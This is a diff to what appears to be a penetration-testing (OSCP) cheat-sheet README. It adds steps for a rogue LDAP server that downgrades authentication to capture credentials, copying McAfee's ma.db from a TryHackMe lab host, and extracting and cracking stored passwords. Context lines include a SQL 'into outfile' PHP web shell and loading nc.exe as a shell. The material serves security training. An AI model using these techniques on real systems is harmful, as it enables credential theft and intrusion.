@@ -7,7 +7,9 @@
   - [Linux Boxes](#linux-boxes)
 - [SQL](#sql)
   - [MYSQL](#mysql)
+  - [sqlite](#salite)
   - [SQLi](#sqli)
+ 
 - [Tools](#tools)
   - [feroxbuster](#feroxbuster)
   - [gobuster](#gobuster)
@@ -30,6 +32,7 @@
   - [Invoke-RunasCs.ps1](#invoke-runascs.ps1)
   - [GMSAPasswordReader](#GMSAPasswordReader)
   - [smbserver](#smbserver)
+  - [Rogue LDAP Server](#rogue-ldap-server)
   - [chisel](#chisel)
   - [Responder](#responder)
   - [Hydra](#hydra)
@@ -37,6 +40,7 @@
   - [Cadaver](#cadaver)
   - [dig](#dig)
   - [dnsenum](#dnsenum)
+  - [McAfee](#McAfee)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -71,6 +75,7 @@
 ```bash
 C:/Users/Administrator/NTUser.dat
 C:/xampp/phpMyAdmin/config.inc.php
+C:\ProgramData\McAfee\Agent\DB\ma.db
 ```
 
 - Linux
@@ -274,6 +279,12 @@ select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile "/srv/http/cmd.php
 select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
 select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
 ```
+
+## sqlite
+```bash
+sqlitebrowser ma.db
+```
+
 
 ## SQLi
 - mssql command injection
@@ -564,6 +575,51 @@ sudo smbserver.py -smb2support share $(pwd)
 sudo smbserver.py -smb2support share $(pwd) -user kali -password kali
 ```
 
+### Rogue LDAP Server
+```bash
+sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
+sudo dpkg-reconfigure -p low slapd
+```
+
+Make sure to press <No> when requested if you want to skip server configuration
+![image](https://github.com/nuricheun/OSCP/assets/14031269/19d32655-1321-4ca1-b9eb-f9cf9a49f585)
+
+For the DNS domain name, you want to provide our target domain, which is za.tryhackme.com
+![image](https://github.com/nuricheun/OSCP/assets/14031269/c3cdb6b1-1ceb-49dd-8e44-65e732d35b64)
+
+Use this same name for the Organisation name as well: 
+![image](https://github.com/nuricheun/OSCP/assets/14031269/ef463b93-a993-40b6-8dd2-516f87bd4cfa)
+
+Provide any Administrator password:
+![image](https://github.com/nuricheun/OSCP/assets/14031269/85d54c2f-01de-45e6-bf4b-141b241d20eb)
+
+Select MDB as the LDAP database to use:
+![image](https://github.com/nuricheun/OSCP/assets/14031269/4a456705-471b-4551-97fb-bd619dbc5f6a)
+
+For the last two options, ensure the database is not removed when purged:
+![image](https://github.com/nuricheun/OSCP/assets/14031269/99675705-69a0-4ee5-96ec-b783a8e44b1a)
+
+Move old database files before a new one is created:
+![image](https://github.com/nuricheun/OSCP/assets/14031269/6eb3503c-f51d-415a-9c3d-c57785c767d8)
+
+Create olcSaslSecProps.ldif
+```bash
+#olcSaslSecProps.ldif
+dn: cn=config
+replace: olcSaslSecProps
+olcSaslSecProps: noanonymous,minssf=0,passcred
+```
+
+Now we can use the ldif file to patch our LDAP server using the following:
+```bash
+sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+```
+
+Capture traffic through tcpdump
+```bash
+sudo tcpdump -SX -i breachad tcp port 389
+```
+
 
 ### gpp-decrypt(Groups.xml)
 ```bash
@@ -762,6 +818,21 @@ dig @10.10.10.161 AXFR htb.local
 ```bash
 dnsenum 192.168.162.122
 ```
+
+### scp
+```bash
+# copy the ma.db to our AttackBox:
+scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+
+```
+
+### McAfee
+- location: C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB\ma.db
+- transfer files to kali linux: scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+- view contents with sqlitebrowser: sqlitebrowser ma.db
+- focus on the AGENT_REPOSITORIES table
+- check DOMAIN, AUTH_USER, and AUTH_PASSWD field
+- crack credentials: https://github.com/funoverip/mcafee-sitelist-pwd-decryption
 
 ### bloodhound-python
 ```bash
